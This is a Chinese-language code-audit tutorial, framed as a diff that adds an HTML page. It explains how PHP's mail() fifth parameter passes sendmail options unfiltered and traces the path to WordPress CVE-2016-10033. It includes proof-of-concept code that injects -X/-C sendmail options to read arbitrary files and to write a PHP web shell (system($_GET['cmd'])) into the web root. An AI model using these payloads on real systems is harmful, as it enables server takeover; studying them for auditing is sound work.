@@ -1,0 +1,137 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="37026fd660e76ba7c8db354de8edcae1">前言</h1>
+<p>准备重新写一个关于php敏感函数的系列文章，通过这些知识点能尽快的认识到一些函数在默认参数情况下（或者说习惯做法）可能造成的风险，同时也能让我们在代码审计时能够较快的定位漏洞点，大大提高审计效率。每篇文章都会从函数使用方法介绍、漏洞分析两方面进行总结，最后应该还会跟着一些审计实例。文章比较基础，并且已经有很多类似文章，主要定位就是给代码审计新手作为学习资料的，毕竟自己也是小白，写不出太深奥的文章，出一个系列，也是为了方便查找资料，提高审计效率。<br/>
+<strong><strong>正文</strong></strong><br/>
+这篇文章主要来介绍一下mail（）函数在实际运用中可能出现的任意文件读取和任意命令执行的问题。</p>
+<h1 data-content="1" id="29b53e8f42378d040e7ddee1fd859306">1. 函数使用方法及漏洞成因介绍</h1>
+<pre><code>mail(to,subject,message,headers,parameters)
+  通过官方介绍，我们可以看出来mail函数一共有5个参数：
+  $to --规定邮件接受者（必需）
+  $subject -- 规定邮件的主题。该参数不能包含任何换行字符（必需）
+  $message -- 邮件要发送的信息（必需）
+  $headers -- 规定额外的报头，比如 From, Cc 以及 Bcc。(可选)
+  $parameters -- 规定 sendmail 程序的额外参数。（可选）</code></pre>
+<p>可以明确的看出来mail（）函数的第五个参数是规定sendmail的额外参数，也就是说可以直接把参数内容传递给sendmail。虽然是可选的，但还是有很大一部分代码加带了这个参数。<br/>
+看似没有任何毛病，但是问题就出在传递给sendmail时没有任何过滤，我们再来看一下sendmail有什么功能（功能有很多，我只选择了几个和漏洞有关系的功能）：<br/>
+-O  option=valueSet option option to the specified value. This form uses        long names. See below for more details.</p>
+<p>-X   logfileLog all traffic in and out of mailers in the indicated log          file. This should only be used as a last resort for debugging mailer        bugs. It will log a lot of data very quickly.</p>
+<p>-C      fileUse alternate configuration file. sendmail gives up any enhanced        (set-user-ID or set-group-ID) privileges if an alternate configuration      file is specified.</p>
+<p>QueueDirectory=queuedirSelect the directory in which to queue messages.</p>
+<p>根据官方介绍，sendmail的-O参数是设置一些缺省值。而在mail（）相关漏洞中我们需要设置的是QueueDirectory这个值，他是用来存放mail中的消息队列的。-X参数是用来写入日志文件的，但是sendmail并没有限制日志的写入目录和日志格式，导致我们可以写入任意格式的“日志文件”到任意目录。-C参数用来加载一些配置文件，和-X一样，我们可以加载任意目录的任意格式的“配置文件”。</p>
+<h1 data-content="1" id="aba9330f4eddae824e2043ba769aa0a3">2. mail函数可能造成的风险和问题</h1>
+<p>通过上面mail函数的使用方法和漏洞成因我们知道了，如果不限制第五个参数的内容，而直接传给sendmail的话，就有可能造成任意文件读取和任意文件写入的问题。</p>
+<h2 data-content="1" id="df848a469d3a7a9a14cf4d8bc93cffeb">任意文件读取：</h2>
+<p>测试代码：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'a@b.c'</span><span class="p">;</span>
+<span class="nv">$subject</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">;</span>
+<span class="nv">$message</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$options</span> <span class="o">=</span> <span class="s1">'-OQueueDirectory=/tmp -C/var/www/html/phpinfo.php -X/var/www/html/1.txt'</span><span class="p">;</span>
+<span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>其中-O规定临时目录为/tmp -C加载phpinfo.php为配置文件 -X把日志文件写入/var/www/html/1.txt（因为是读取，所以我用的1.txt，当然可以是任意后缀） 就会导致任意文件读取，把phpinofo.php的内容作为配置文件加载，然后把文件内容写入日志文件1.txt中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181009121421-cc943102-cb79-1.png"/></p>
+<h2 data-content="1" id="1eeaf8a32932298df3dc508829cd89fe">任意文件写入：</h2>
+<p>测试代码：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'a@b.c'</span><span class="p">;</span>
+<span class="nv">$subject</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">;</span>
+<span class="nv">$message</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$options</span> <span class="o">=</span> <span class="s1">'-OQueueDirectory=/tmp -X/var/www/html/rce.php'</span><span class="p">;</span>
+<span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>直接把文件内容写入到rce.php中。即可完成我们的写shell工作。</p>
+<h1 data-content="1" id="cbe42cad75f25083ebeb251ba669e93d">3. mail()实例审计（以wordpress为例CVE-2016-10033）</h1>
+<p>wordpress在&lt; 4.7.1的版本中，因为mail函数的原因，会导致远程代码执行漏洞。这里给大家来演示一下审计过程，我这里的审计还是从mail（）函数出发，来说一下如何快速定位漏洞点。<br/>
+在实际的审计中，我们知道了mail（）函数会导致一定的风险，那么我们再审计的时候，可以全局搜索一下mail（），看看有没有函数造成风险的代码，在wordpress中，我们用法师的审计工具进行全局搜索mail</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181009122206-e142572c-cb7a-1.png"/></p>
+<p>在第49行，我们看到mail函数中存在第五个参数，随机查看相关代码：</p>
+<div class="highlight"><pre><span></span><span class="x">private function mailPassthru($to, $subject, $body, $header, $params)</span>
+<span class="x">    {</span>
+<span class="x">        //Check overloading of mail function to avoid double-encoding</span>
+<span class="x">        if (ini_get('mbstring.func_overload') &amp; 1) {</span>
+<span class="x">            $subject = $this-&gt;secureHeader($subject);</span>
+<span class="x">        } else {</span>
+<span class="x">            $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));</span>
+<span class="x">        }</span>
+
+<span class="x">        //Can't use additional_parameters in safe_mode, calling mail() with null params breaks</span>
+<span class="x">        //@link http://php.net/manual/en/function.mail.php</span>
+<span class="x">        if (ini_get('safe_mode') or !$this-&gt;UseSendmailOptions or is_null($params)) {</span>
+<span class="x">            $result = @mail($to, $subject, $body, $header);</span>
+<span class="x">        } else {</span>
+<span class="x">            $result = @mail($to, $subject, $body, $header, $params);</span>
+<span class="x">        }</span>
+<span class="x">        return $result;</span>
+<span class="x">    }</span>
+</pre></div>
+<p>可以看到第五个参数$params由mailPassthru传入，也就是说如果我们控制了这个参数就会导致相应的问题，我们继续网上追，来看一下我们能不能控制这个地方</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181009122455-46146bc2-cb7b-1.png"/></p>
+<p>只有一个地方调用了mailPassthru() ，查看相应代码：</p>
+<div class="highlight"><pre><span></span><span class="x">protected function mailSend($header, $body)</span>
+<span class="x">    {</span>
+<span class="x">        $toArr = array();</span>
+<span class="x">        foreach ($this-&gt;to as $toaddr) {</span>
+<span class="x">            $toArr[] = $this-&gt;addrFormat($toaddr);</span>
+<span class="x">        }</span>
+<span class="x">        $to = implode(', ', $toArr);</span>
+
+<span class="x">        $params = null;</span>
+<span class="x">        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span>
+<span class="x">        if (!empty($this-&gt;Sender) and $this-&gt;validateAddress($this-&gt;Sender)) {</span>
+<span class="x">            // CVE-2016-10033, CVE-2016-10045: Don't pass -f if characters will be escaped.</span>
+<span class="x">            if (self::isShellSafe($this-&gt;Sender)) {</span>
+<span class="x">                $params = sprintf('-f%s', $this-&gt;Sender);</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">        if (!empty($this-&gt;Sender) and !ini_get('safe_mode') and $this-&gt;validateAddress($this-&gt;Sender)) {</span>
+<span class="x">            $old_from = ini_get('sendmail_from');</span>
+<span class="x">            ini_set('sendmail_from', $this-&gt;Sender);</span>
+<span class="x">        }</span>
+<span class="x">        $result = false;</span>
+<span class="x">        if ($this-&gt;SingleTo and count($toArr) &gt; 1) {</span>
+<span class="x">            foreach ($toArr as $toAddr) {</span>
+<span class="x">                $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params);</span>
+<span class="x">                $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);</span>
+<span class="x">            }</span>
+<span class="x">        } else {</span>
+<span class="x">            $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params);</span>
+<span class="x">            $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From);</span>
+<span class="x">        }</span>
+<span class="x">        if (isset($old_from)) {</span>
+<span class="x">            ini_set('sendmail_from', $old_from);</span>
+<span class="x">        }</span>
+<span class="x">        if (!$result) {</span>
+<span class="x">            throw new phpmailerException($this-&gt;lang('instantiate'), self::STOP_CRITICAL);</span>
+<span class="x">        }</span>
+<span class="x">        return true;</span>
+<span class="x">    }</span>
+</pre></div>
+<p>可以看到$params = sprintf('-f%s', $this-&gt;Sender); 继续追$this-&gt;Sender</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181009122749-ade41c20-cb7b-1.png"/><br/>
+可以看到$this-&gt;Sender在setFrom()中由$adress获得，而$address是setFrom()的第一个参数，于是继续追setFrom()</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181009123003-fdae043c-cb7b-1.png"/></p>
+<p>查看代码：</p>
+<div class="highlight"><pre><span></span><span class="x">if ( !isset( $from_name ) )</span>
+<span class="x">        $from_name = 'WordPress';</span>
+<span class="x">    if ( !isset( $from_email ) ) {</span>
+<span class="x">        // Get the site domain and get rid of www.</span>
+<span class="x">        $sitename = strtolower( $_SERVER['SERVER_NAME'] );</span>
+<span class="x">        if ( substr( $sitename, 0, 4 ) == 'www.' ) {</span>
+<span class="x">            $sitename = substr( $sitename, 4 );</span>
+<span class="x">        }</span>
+<span class="x">        $from_email = 'wordpress@' . $sitename;</span>
+<span class="x">    }</span>
+
+<span class="x">...</span>
+<span class="x">    $phpmailer-&gt;setFrom( $from_email, $from_name, false );</span>
+</pre></div>
+<p>可以看出来setFrom的第一个参数$from_email由$from_email = 'wordpress@' . $sitename;获得，而$sitename由$_SERVER['SERVER_NAME']获得，在实际的利用中我们是可以控制SERVER_NAME的，也就是可以控制$sitename，从而能够控制mail（）的第五个参数，从而造成漏洞的产生，当然要在wordpress中利用这个漏洞，还需要绕过一些过滤，这不是本文的重点。网上也有很多相应的绕过分析，大家可以去参考。</p>
+<p>分析漏洞所用的wordpress版本已经在附件中打包。</p>
+</div>
+</div>
